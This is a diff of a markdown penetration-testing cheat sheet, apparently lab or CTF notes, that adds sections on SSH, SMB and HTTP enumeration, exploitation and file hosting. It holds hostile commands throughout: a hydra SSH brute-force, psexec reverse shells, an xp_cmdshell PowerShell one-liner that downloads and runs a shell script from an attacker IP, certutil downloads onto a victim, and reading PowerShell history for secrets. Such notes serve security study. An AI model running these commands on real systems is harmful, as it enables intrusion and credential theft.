@@ -7,14 +7,28 @@
 Scan for open ports: `nmap <IP> -p- -T4` <br />
 Scan for services and their versions: `nmap <IP> -p<PORT>,<PORT2>,<...> -T4 -A` <br />
   
+## Enumeration
 
-### SMB
+### SSH (22)
+try to connect to ssh: `ssh 192.168.57.134`. In case of `no matching key exchange method found. Their offer...` use something in lines of `ssh 192.168.57.134 -oKexAlgorithms diffie-hellman-group1-sha1` or `ssh 192.168.57.134 -oKexAlgorithms diffie-hellman-group1-sha1 -c aes128-cbc`<br />
+see if a banner is returned (for version detection) and if a password is required <br />
+
+### SMB (139/445)
 
 try to list available shares on smb: `smbclient -L -N \\\\<IP>\\` <br />
 connect to smb-share: `smbclient \\\\<IP>\\<SHARE>` <br />
 download file from share: `get \<FILE>` <br />
 
 try to find out version of smb-service: use metasploit module ...smb_version TODO <br />
+
+### HTTP/HTTPS (80/443)
+
+visit webpage in browser
+
+try to enumerate directories via gobuster or dirbuster e.g. `gobuster dir -u https://<IP> -w /usr/share/wordlists/dirbuster/common -k` <br />
+typical file extensions are: for Apache .php; for Microsoft asp, aspx; for Others .php, .txt, .rar, .pdf, .docx, ... <br />
+(optional) use nikto to find vulnerabilities `nikto -h http(s)://<IP>` <br />
+
 
 ### SQL (Windows)
 
@@ -25,15 +39,24 @@ check for admin priviledges to be able to have remote code execution ``SELECT IS
 
 ## Exploitation
 
-### SMB
+### SSH (22)
+try to bruteforce ssh login with hydra `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://<IP>:<PORT> -t 4 -V` <br />
+bruteforcing creates a lot of noise and will probably be discovered.
+TODO: what is this? use auxiliary/scanner/ssh/ssh_login
+
+### SMB (139/445)
 
 Try to get a reverse shell for a given user and password via psexec (impacket):
 `psexec.py '\<USER>:\<PW>@\<IP>'` <br />
 
-Check for vulnerability in combination with ftp of ms17_010
+Check for vulnerability in combination with FTP of ms17_010
 
 
-### SQL (Windows)
+### HTTP/HTTPS (80/443)
+Burpsuite! <br />
+
+
+### MicrosoftSQL (TODO)
 
 if we have sysadmin privileges we can enable the xp_cmdshell to gain remote code execution on the host
 ```
@@ -48,10 +71,20 @@ we then can download a malicious script from our HTTPServer. We can use a One-Li
 from the sql server both download and run it directly via `xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.3/shell.ps1\");"` <br />
 set up the listener beforehand as usual.
 
+### Hosting a webserver to remotely download files onto the victim machine
+- Use `sudo python -m SimpleHTTPServer <PORT>` to run a HTTP-Server inside the current directory <br />
+- Use `sudo systemctl start apache2` to run a HTTP-Server on /var/www <br />
 
-### Privilege Escalation
+Download files on linux via `wget http://<IP>/<File>` or curl TODO <br />
+Download files on windows via powershell and `certutil -urlcache -f http://<IP>/<FILE> <PATHONVICTIM>\<FILE>` <br />
+Download files on windows via cmd TODO
 
-## Windows
+### Creating malicious code with msfvenom
+Show available payloads with `msfvenom -l payloads` <br />
+
+## Privilege Escalation
+
+### Windows
 
 check the PowerShell history file: `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
